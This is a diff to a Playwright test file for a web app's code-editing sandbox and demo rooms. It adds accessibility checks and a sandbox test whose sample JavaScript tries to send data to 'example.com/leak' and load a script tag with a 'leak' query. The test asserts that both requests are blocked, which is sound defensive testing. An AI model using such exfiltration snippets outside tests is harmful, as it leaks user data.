@@ -43,12 +43,16 @@ test('@claim:sandbox-run edited code runs inside a network-blocked sandbox', asy
   const html = page.locator('[data-code="html"]');
   await html.fill('<main><h1>My changed signal</h1><p id="result">Ready</p></main>');
   await page.getByRole('tab', { name: 'JavaScript' }).click();
-  await page.locator('[data-code="javascript"]').fill("document.querySelector('#result').textContent = 'Code ran'; fetch('https://example.com/leak')");
+  await page.getByRole('tab', { name: 'JavaScript' }).press('ArrowLeft');
+  await expect(page.getByRole('tab', { name: 'CSS' })).toHaveAttribute('aria-selected', 'true');
+  await page.getByRole('tab', { name: 'JavaScript' }).click();
+  await page.locator('[data-code="javascript"]').fill("document.querySelector('#result').textContent = 'Code ran'; fetch('https://example.com/leak'); const tag = document.createElement('script'); tag.src = '/api/demo?leak=blocked'; document.body.append(tag)");
   await page.getByRole('button', { name: 'Run the page' }).click();
   const preview = page.frameLocator('#result-frame');
   await expect(preview.getByRole('heading', { name: 'My changed signal' })).toBeVisible();
   await expect(preview.getByText('Code ran')).toBeVisible();
   expect(outgoing.some((url) => url.startsWith('https://example.com'))).toBe(false);
+  expect(outgoing.some((url) => url.includes('leak=blocked'))).toBe(false);
 });
 
 test('@claim:demo-reset reset creates a fresh temporary sample room', async ({ page }) => {
@@ -125,6 +129,15 @@ test('landing, demo, and legal pages have no serious accessibility findings', as
     const serious = results.violations.filter((violation) => ['serious', 'critical'].includes(violation.impact ?? ''));
     expect(serious, `${route}: ${serious.map((item) => item.id).join(', ')}`).toEqual([]);
   }
+  const demo = await page.request.post('/api/demo', { data: {} });
+  const room = (await demo.json()).room;
+  await page.goto(`/room/${room.id}`);
+  let results = await new AxeBuilder({ page }).analyze();
+  expect(results.violations.filter((violation) => ['serious', 'critical'].includes(violation.impact ?? ''))).toEqual([]);
+  await page.getByLabel('Screen name').fill('A11y Finch');
+  await page.getByRole('button', { name: 'Join the exercise' }).click();
+  results = await new AxeBuilder({ page }).analyze();
+  expect(results.violations.filter((violation) => ['serious', 'critical'].includes(violation.impact ?? ''))).toEqual([]);
 });
 
 test('all API routes return Retry-After when one client exceeds the limit', async ({ request }) => {
